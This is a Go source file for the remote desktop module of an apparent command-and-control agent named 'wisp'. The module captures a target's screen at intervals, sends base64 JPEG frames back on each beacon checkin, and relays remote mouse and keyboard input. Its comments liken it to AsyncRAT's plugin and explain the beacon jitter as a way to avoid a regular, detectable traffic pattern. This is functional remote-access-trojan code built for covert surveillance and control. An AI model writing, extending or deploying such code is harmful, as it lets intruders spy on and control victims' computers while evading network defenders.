package commands

// Remote desktop support. The agent captures the screen on a fixed interval
// (like AsyncRAT's plugin) and reports the most recent JPEG frame on every
// checkin, so the server can relay it to the frontend as a live stream.
// Each frame is a task result tagged with a dedicated "rdp:<session>" task id
// and a status of "rdpframe" that the server forwards without persisting.

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/user/wisp/shared/protocol"
)

// RDPFrameStatus is the Result status used for screen frames. The server
// detects it and forwards the frame to the frontend without touching the DB.
const RDPFrameStatus = "rdpframe"

// CaptureScreen is the platform capture function; exported so the remote
// control client can reuse it, and swappable in tests.
var CaptureScreen = captureScreen

// rdpFrame is one screen capture, encoded as JPEG in base64.
type rdpFrame struct {
	Seq  uint64 `json:"seq"`
	W    int    `json:"w"`
	H    int    `json:"h"`
	Data string `json:"data"` // base64 JPEG bytes
}

// rdpSession holds the state of an active remote desktop stream.
type rdpSession struct {
	mu             sync.Mutex
	frameTaskID    string
	quality        int
	seq            uint64
	latest         *rdpFrame // most recent frame not yet reported
	stop           chan struct{}
	done           chan struct{}
	interval       time.Duration
	streamJitter   int // jitter % applied while streaming
	restoreSleep   int // ms to restore on stop
	restoreJitter  int // % to restore on stop
	capture        func(quality int) ([]byte, int, int, error)
}

// execRDPStart begins a screen capture stream on the agent.
// args: {"frame_task_id":"rdp:<session>","interval":500,"quality":50,
//
//	"jitter":15,"restore_sleep":5000,"restore_jitter":20}
//
// While streaming, the checkin interval is tightened to the frame interval
// (with a small jitter so the beacon pattern does not become mechanically
// regular); when the stream stops the previous sleep/jitter are restored.
func (d *Dispatcher) execRDPStart(argsJSON string) string {
	var args struct {
		FrameTaskID   string `json:"frame_task_id"`
		Interval      int    `json:"interval"`       // checkin interval in ms
		Quality       int    `json:"quality"`        // JPEG quality 1-100
		Jitter        int    `json:"jitter"`         // jitter % while streaming (0-100)
		RestoreSleep  int    `json:"restore_sleep"`  // ms to restore on stop
		RestoreJitter int    `json:"restore_jitter"` // % to restore on stop
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return "error: invalid rdp args: " + err.Error()
	}
	if args.FrameTaskID == "" {
		return "error: frame_task_id is required"
	}
	if err := checkPlatform(); err != nil {
		return "error: " + err.Error()
	}

	// Replace any existing session first
	d.execRDPStop()

	interval := time.Duration(args.Interval) * time.Millisecond
	if interval < 200*time.Millisecond {
		interval = 200 * time.Millisecond
	}
	quality := args.Quality
	if quality < 10 {
		quality = 30
	}
	if quality > 100 {
		quality = 100
	}
	jitter := args.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}

	sess := &rdpSession{
		frameTaskID:   args.FrameTaskID,
		quality:       quality,
		interval:      interval,
		streamJitter:  jitter,
		restoreSleep:  args.RestoreSleep,
		restoreJitter: args.RestoreJitter,
		stop:          make(chan struct{}),
		done:          make(chan struct{}),
		capture:       CaptureScreen,
	}
	d.rdpMu.Lock()
	d.rdp = sess
	d.rdpMu.Unlock()

	// Tighten the checkin interval while streaming so frames flow at interval
	// rate, applying the stream jitter on top.
	if d.OnSleep != nil && args.Interval > 0 {
		d.OnSleep(args.Interval, jitter)
	}

	go sess.run()
	return fmt.Sprintf("remote desktop started (%s, %dms interval, quality %d, jitter %d%%)", args.FrameTaskID, args.Interval, quality, jitter)
}

// execRDPStop halts the screen capture stream and restores the prior sleep/jitter.
func (d *Dispatcher) execRDPStop() string {
	d.rdpMu.Lock()
	sess := d.rdp
	d.rdp = nil
	d.rdpMu.Unlock()
	if sess == nil {
		return "remote desktop not running"
	}
	close(sess.stop)
	// Never block the task loop forever on a stuck capture (e.g. a frozen GDI
	// call on the target); fall back to a forced stop after a short wait.
	select {
	case <-sess.done:
	case <-time.After(2 * time.Second):
		return "remote desktop stopped (forced)"
	}
	if d.OnSleep != nil {
		// Never restore to 0ms (busy-loop); clamp to the safe minimum.
		restoreSleep := sess.restoreSleep
		if restoreSleep < protocol.MinSleepMS {
			restoreSleep = protocol.MinSleepMS
		}
		d.OnSleep(restoreSleep, sess.restoreJitter)
	}
	return "remote desktop stopped"
}

// execRDPInput forwards an input event (mouse / keyboard) to the platform layer.
func (d *Dispatcher) execRDPInput(argsJSON string) string {
	return rdpInput(argsJSON)
}

// RDPFrame returns the newest unsent frame as a task result, or nil when no
// session is active or no new frame is pending. Called once per checkin from
// the main loop.
func (d *Dispatcher) RDPFrame() *Result {
	d.rdpMu.Lock()
	sess := d.rdp
	d.rdpMu.Unlock()
	if sess == nil {
		return nil
	}

	sess.mu.Lock()
	if sess.latest == nil {
		sess.mu.Unlock()
		return nil
	}
	frame := sess.latest
	sess.latest = nil
	taskID := sess.frameTaskID
	sess.mu.Unlock()

	out, err := json.Marshal(frame)
	if err != nil {
		return nil
	}
	return &Result{TaskID: taskID, Output: string(out), Status: RDPFrameStatus}
}

// run is the capture loop. It captures a frame immediately and then once per
// interval, always keeping only the newest frame for the next checkin.
func (s *rdpSession) run() {
	defer close(s.done)
	defer recoverGoroutine("rdp.run")
	ticker := time.NewTicker(s.interval)
	defer ticker.Stop()

	for {
		s.grabFrame()
		select {
		case <-s.stop:
			return
		case <-ticker.C:
		}
	}
}

// grabFrame captures one frame and stores it as the pending frame.
func (s *rdpSession) grabFrame() {
	data, w, h, err := s.capture(s.quality)
	if err != nil {
		return // transient capture error: skip this tick
	}
	s.mu.Lock()
	s.seq++
	s.latest = &rdpFrame{Seq: s.seq, W: w, H: h, Data: base64.StdEncoding.EncodeToString(data)}
	s.mu.Unlock()
}
